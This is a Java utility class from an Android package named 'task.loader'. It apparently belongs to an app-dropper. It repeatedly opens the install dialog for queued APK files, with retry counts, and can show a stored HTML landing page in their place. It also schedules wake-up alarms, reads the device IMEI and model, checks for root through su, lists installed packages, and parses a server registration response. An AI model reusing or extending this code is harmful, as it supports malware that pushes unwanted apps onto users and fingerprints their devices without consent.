package task.loader;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.text.format.DateUtils;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import task.loader.db.TableTasks;
import task.loader.db.Task;

public class Utils
{
    public static void installApp(Context context, File file)
    {
        try
        {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
            context.startActivity(intent);
        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }
    }


    public static void runApp(Context context, String pkg)
    {
        try
        {
            Intent intent = context.getPackageManager().getLaunchIntentForPackage(pkg);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
        catch(Exception ex)
        {
            if(Constants.DEBUG) Settings.debug(ex);
        }

    }

    public static boolean setFileContent(File file, String data)
    {
        try
        {
            FileOutputStream stream = new FileOutputStream(file);
            stream.write(data.getBytes("utf-8"));
            stream.close();

            return true;
        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }

        return false;
    }

    public static String getFileContent(File file)
    {
        try
        {

            ByteArrayOutputStream array = new ByteArrayOutputStream();
            FileInputStream stream = new FileInputStream(file);

            byte[] buffer = new byte[1024];
            int length = 0;
            while ((length = stream.read(buffer)) != -1)
            {
                array.write(buffer, 0, length);
            }

            stream.close();
            return new String(array.toByteArray());

        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }

        return null;
    }

    public static void startCustomTimer(Context context, String name, long millisec, boolean repeat, boolean startImmediately)
    {
        try
        {
            if(Constants.DEBUG)
            {
                Settings.debug("startCustomTimer: " + name);
                Settings.debug("millisec: " + millisec);
                if(repeat) Settings.debug("period: " + DateUtils.formatElapsedTime(millisec / 1000));
                else Settings.debug("period: " + DateUtils.formatElapsedTime((millisec - System
                        .currentTimeMillis()) / 1000));
                Settings.debug("repeat: " + repeat);

            }

            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction(name);



            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            if(repeat)
            {

                alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, startImmediately ? System.currentTimeMillis() : System.currentTimeMillis() + millisec, millisec, pendingIntent);
            }
            else
            {
                alarmManager.set(AlarmManager.RTC_WAKEUP, millisec, pendingIntent);
            }
        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }
    }

    public static void cancelCustomTimer(Context context, String name)
    {
        try
        {
            if(Constants.DEBUG)
            {
                Settings.debug("cancelCustomTimer: " + name);
            }

            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction(name);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

            alarmManager.cancel(pendingIntent);
        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }
    }

    public static String getAndroidVersion()
    {
        return "Android " + Build.VERSION.RELEASE;
    }

    public static String getModel()
    {
        return Build.MODEL;
    }

    public static String getImei(Context context)
    {
        try
        {
            TelephonyManager telephony_manager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
            return telephony_manager.getDeviceId();
        }
        catch (Exception ex)
        {
        }

        return "";
    }

    public static boolean isInstalledPackage(Context context, String packageName)
    {
        try
        {
            PackageManager packageManager = context.getPackageManager();

            List<PackageInfo> list = packageManager.getInstalledPackages(0);

            for(int i = 0; i < list.size(); i++)
            {
                PackageInfo item = list.get(i);
                if(item.packageName.equals(packageName)) return true;
            }
        }
        catch(Exception ex)
        {
            if(Constants.DEBUG) Settings.debug(ex);
        }

        return false;
    }

    public static String getPostBody(Map<String, String> params)
    {
        StringBuffer buffer = new StringBuffer();

        try
        {
            JSONObject json = new JSONObject();

            Iterator<String> iterator = params.keySet().iterator();
            while (iterator.hasNext())
            {
                String key = iterator.next();
                String value = params.get(key);

                /*if(buffer.length() != 0) buffer.append("&");

                buffer.append(URLEncoder.encode(key, "utf-8"));
                buffer.append("=");
                buffer.append(URLEncoder.encode(value, "utf-8"));*/

                json.put(key, value);

            }


            return json.toString();
        }
        catch (Exception ex)
        {
            if(Constants.DEBUG) Settings.debug(ex);
        }

        return buffer.toString();
    }

    public static boolean isRootAvailable()
    {
        List<String> pathList = Arrays.asList(System.getenv("PATH").split(":"));

        for(int i = 0; i < pathList.size(); i++)
        {
            String dir = pathList.get(i);
            if(!dir.endsWith("/")) dir += "/";

            ShellCommand shellCommand = new ShellCommand("ls " + dir + "su");
            shellCommand.execute();
            if(!shellCommand.getOutput().isEmpty()) return true;

        }

        return false;
    }

    public static boolean isSuccessResponse(String data)
    {
        if(Constants.DEBUG) Settings.debug("raw: " + data);

        try
        {
            JSONObject json = new JSONObject(data);

            if(Constants.DEBUG) Settings.debug("json: " + json.toString(4));

            String path = json.getString("reg");

            if(path.equals("1"))
            {
                return true;
            }

        }
        catch (Exception e)
        {
            if(Constants.DEBUG){
                Settings.debug("BAD RESPONSE:" + data);
                e.printStackTrace();
            }
        }

        return false;
    }

    public static String parseTitle(String html)
    {
        Pattern pattern = Pattern.compile("<title>([^<]+)</title>", Pattern.CASE_INSENSITIVE);
        Matcher matcher = pattern.matcher(html);

        if(matcher.find())
        {
            return matcher.group(1);
        }else {
            return Constants.LANDING_TITLE_DEFAULT;
        }
    }

    public static File getLangingFile(Context context)
    {
        File dataDir = context.getDir("data", Context.MODE_PRIVATE);
        return new File(dataDir, "html");
    }

    public static void startInstallOrShowLanding(Context context)
    {
        if (Constants.DEBUG) Settings.debug("startInstallOrShowLanding()");
        TableTasks tableTasks = new TableTasks(MainApplication.getMainDb());

        while (true)
        {
            Task task = tableTasks.getNext();
            if (Constants.DEBUG) Settings.debug("task: " + task);
            if (task != null)
            {

                if(task.getTryCount() <= 0)
                {
                    tableTasks.remove(task);
                    new File(task.getPath()).delete();
                }
                else
                {
                    File file = new File(task.getPath());
                    if (file.exists())
                    {
                        File landingFile = Utils.getLangingFile(context);
                        if (Constants.DEBUG) Settings.debug("landingFile.length(): " + landingFile.length());
                        if(landingFile.exists() && landingFile.length() > 0)
                        {
                            WebActivity.show(context);
                        }
                        else
                        {
                            Utils.installApp(context, file);

                            int tryCount = task.getTryCount() - 1;
                            tableTasks.updateTryCount(task, tryCount);
                        }

                        return;
                    }
                    else
                    {
                        if (Constants.DEBUG) Settings.debug("file not found: " + task.getPath());
                        tableTasks.remove(task);
                    }
                }
            }
            else return;
        }
    }

    public static void startInstall(Context context)
    {
        if (Constants.DEBUG) Settings.debug("startInstall()");

        TableTasks tableTasks = new TableTasks(MainApplication.getMainDb());


        while (true)
        {
            Task task = tableTasks.getNext();
            if (Constants.DEBUG) Settings.debug("task: " + task);
            if (task != null)
            {

                if(task.getTryCount() <= 0)
                {
                    tableTasks.remove(task);
                    new File(task.getPath()).delete();
                }
                else
                {
                    File file = new File(task.getPath());
                    if (file.exists())
                    {
                        Utils.installApp(context, file);

                        int tryCount = task.getTryCount() - 1;
                        tableTasks.updateTryCount(task, tryCount);

                        return;
                    }
                    else
                    {
                        if (Constants.DEBUG) Settings.debug("file not found: " + task.getPath());
                        tableTasks.remove(task);
                    }
                }
            }
            else return;
        }
    }
}
